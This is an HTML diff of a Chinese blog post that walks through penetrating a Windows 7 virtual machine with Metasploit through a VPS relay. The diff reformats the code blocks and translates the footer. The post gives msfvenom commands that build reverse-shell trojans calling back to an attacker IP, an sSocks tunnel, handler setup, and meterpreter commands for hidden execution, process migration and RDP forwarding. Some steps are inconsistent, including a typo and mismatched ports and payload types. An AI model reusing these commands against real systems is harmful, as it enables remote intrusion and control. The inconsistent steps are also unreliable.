@@ -127,74 +127,100 @@
 </ul>
 <p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试）</p>
 <p>操作系统位数查看：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure>
-
-<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 linux/x86/meterpreter/reverse_tcp</span><br><span class="line">2 linux/x86/meterpreter/bind_tcp</span><br><span class="line">3 linux/x86/shell_bind_tcp</span><br><span class="line">4 linux/x86/shell_reverse_tcp</span><br><span class="line">5 linux/x64/shell_reverse_tcp</span><br><span class="line">6 linux/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>
-
-<p>windows相关payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 windows/meterpreter/reverse_tcp</span><br><span class="line">2 windows/meterpreter/bind_tcp</span><br><span class="line">3 windows/shell_reverse_tcp</span><br><span class="line">4 windows/shell_bind_tcp</span><br><span class="line">5 windows/x64/meterpreter/reverse_tcp</span><br><span class="line">6 windows/x64/meterpreter/bind_tcp</span><br><span class="line">7 windows/x64/shell_reverse_tcp</span><br><span class="line">8 windows/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>
-
-<p>payload具体参数含义:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>
-
-<p>一个典型的msfvenom使用举例如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&apos;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</span><br></pre></td></tr></table></figure>
-
-<h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
+<pre><code>getconf LONG_BIT</code></pre><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
+<pre><code>1 linux/x86/meterpreter/reverse_tcp
+2 linux/x86/meterpreter/bind_tcp
+3 linux/x86/shell_bind_tcp
+4 linux/x86/shell_reverse_tcp
+5 linux/x64/shell_reverse_tcp
+6 linux/x64/shell_bind_tcp</code></pre><p>windows相关payload:</p>
+<pre><code>1 windows/meterpreter/reverse_tcp
+2 windows/meterpreter/bind_tcp
+3 windows/shell_reverse_tcp
+4 windows/shell_bind_tcp
+5 windows/x64/meterpreter/reverse_tcp
+6 windows/x64/meterpreter/bind_tcp
+7 windows/x64/shell_reverse_tcp
+8 windows/x64/shell_bind_tcp</code></pre><p>payload具体参数含义:</p>
+<pre><code>-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)
+-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
+-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
+-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+-a, --arch       &lt;architecture&gt;  指定payload的目标架构
+    --platform   &lt;platform&gt;      指定payload的目标平台
+-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
+-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;
+-i, --iterations &lt;count&gt;         指定payload的编码次数
+-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
+-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
+-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+    --payload-options            列举payload的标准选项
+-o, --out   &lt;path&gt;               保存payload
+-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
+    --shellest                   最小化生成payload
+-h, --help                       查看帮助选项
+    --help-formats               查看msf支持的输出格式列表</code></pre><p>一个典型的msfvenom使用举例如下：</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</code></pre><h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
 <p>因为我是内网的Kali，所以要进行内网穿透：<br>内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透，就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>
 <p>首先我们为什么要内网穿透？因为我们的kali在内网，当木鸡（简称）执行我们msf生成的EXE木马时，它会把自己的Shell反弹出去，当然这个Shell不可能反弹到我们自己的内网。那么我们就需要有个外网的ip来监听这个Shell。当然，我们也可以用自己的外网ip来映射到kali上。但是一方面我觉得不安全，另一方面我觉得windows限制太多了，所以就利用我有的一台Centos7的VPS来当作这个跳板。时间不多了，开始记录一下目前的步骤：</p>
 <h2 id="获取meterpreter会话"><a href="#获取meterpreter会话" class="headerlink" title="获取meterpreter会话"></a>获取meterpreter会话</h2><h3 id="VPS开启流量转发"><a href="#VPS开启流量转发" class="headerlink" title="VPS开启流量转发"></a>VPS开启流量转发</h3><p>在网上看到有人说用lcx作为内网端口转发的工具，但是centos7好像编译环境不允许lcx，使用不起。用Ssocks搭建隧道，监听两个端口，7777用来接收来自受害者反弹的shell，7778将7777的流量转发出。下载sSocks，执行命令编译<code>./configure &amp;&amp; make</code>,进入src文件夹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rcsocks -l 7777 -p 7778</span><br></pre></td></tr></table></figure>
-
-<h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
-
-<h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
-
-<h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload</span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址</span><br><span class="line">lhost =&gt; xxxxx(外网Ip) </span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; generate -b &apos;\x00\xff&apos; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe</span><br><span class="line">[*] Writing 73802 bytes to /root/test.exe...</span><br></pre></td></tr></table></figure>
-
-<h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; payload(reverse_tcp) &gt; back</span><br></pre></td></tr></table></figure>
-
-<p>运行监听模块：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>
-
-<p>设置接收的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>
-
-<p>设置vps监听的地址和转发的端口：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; set rhost xxxx(外网Ip)</span><br><span class="line">rhost =&gt; xxxx(外网Ip)</span><br><span class="line">msf exploit(handler) &gt; set lport 7778</span><br><span class="line">lport =&gt; 7778</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Sending stage (957999 bytes) to xxxx(外网Ip)</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
-
-<h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomd +x ./shell.elf</span><br></pre></td></tr></table></figure>
-
-<p>然后再运行就可以了</p>
-<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background  # 让meterpreter处于后台模式  </span><br><span class="line">sessions -i index   # 与会话进行交互，index表示第一个session  </span><br><span class="line">quit  # 退出会话  </span><br><span class="line">shell # 获得控制台权限  </span><br><span class="line">irb # 开启ruby终端</span><br></pre></td></tr></table></figure>
-
-<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat # 查看文件内容  </span><br><span class="line">getwd # 查看当前工作目录  </span><br><span class="line">upload  # 上传文件到目标机上  </span><br><span class="line">download # 下载文件到本机上  </span><br><span class="line">edit # 编辑文件  </span><br><span class="line">search  # 搜索文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig / ifconfig # 查看网络接口信息  </span><br><span class="line">portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 </span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line">route # 获取路由表信息</span><br></pre></td></tr></table></figure>
-
-<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps # 查看当前活跃进程 </span><br><span class="line">migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 </span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 </span><br><span class="line">getpid # 获取当前进程的pid </span><br><span class="line">kill pid # 杀死进程 </span><br><span class="line">getuid # 查看权限 </span><br><span class="line">sysinfo # 查看目标机系统信息，如机器名，操作系统等 </span><br><span class="line">shutdown # 关机</span><br></pre></td></tr></table></figure>
-
-<p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>
+<pre><code>./rcsocks -l 7777 -p 7778</code></pre><h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
+<pre><code>msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload
+msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址
+lhost =&gt; xxxxx(外网Ip) 
+msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)
+lport =&gt; 6666
+msf &gt; payload(reverse_tcp) &gt; generate -b &#39;\x00\xff&#39; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe
+[*] Writing 73802 bytes to /root/test.exe...</code></pre><h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
+<pre><code>msf &gt; payload(reverse_tcp) &gt; back</code></pre><p>运行监听模块：</p>
+<pre><code>msf &gt; use exploit/multi/handler</code></pre><p>设置接收的payload：</p>
+<pre><code>msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</code></pre><p>设置vps监听的地址和转发的端口：</p>
+<pre><code>msf exploit(handler) &gt; set rhost xxxx(外网Ip)
+rhost =&gt; xxxx(外网Ip)
+msf exploit(handler) &gt; set lport 7778
+lport =&gt; 7778
+msf exploit(handler) &gt; exploit
+[*] Started bind handler
+[*] Sending stage (957999 bytes) to xxxx(外网Ip)
+[*] Starting the payload handler...</code></pre><h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
+<pre><code>chomd +x ./shell.elf</code></pre><p>然后再运行就可以了</p>
+<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre><code>background  # 让meterpreter处于后台模式  
+sessions -i index   # 与会话进行交互，index表示第一个session  
+quit  # 退出会话  
+shell # 获得控制台权限  
+irb # 开启ruby终端</code></pre><h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre><code>cat # 查看文件内容  
+getwd # 查看当前工作目录  
+upload  # 上传文件到目标机上  
+download # 下载文件到本机上  
+edit # 编辑文件  
+search  # 搜索文件</code></pre><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre><code>ipconfig / ifconfig # 查看网络接口信息  
+portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 
+rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码
+route # 获取路由表信息</code></pre><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><pre><code>ps # 查看当前活跃进程 
+migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 
+execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 
+getpid # 获取当前进程的pid 
+kill pid # 杀死进程 
+getuid # 查看权限 
+sysinfo # 查看目标机系统信息，如机器名，操作系统等 
+shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>
 
             </div>
           
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/07/09/内网穿透进行Metasploit渗透/">https://hpdoger.cn/2018/07/09/内网穿透进行Metasploit渗透/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -207,7 +233,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
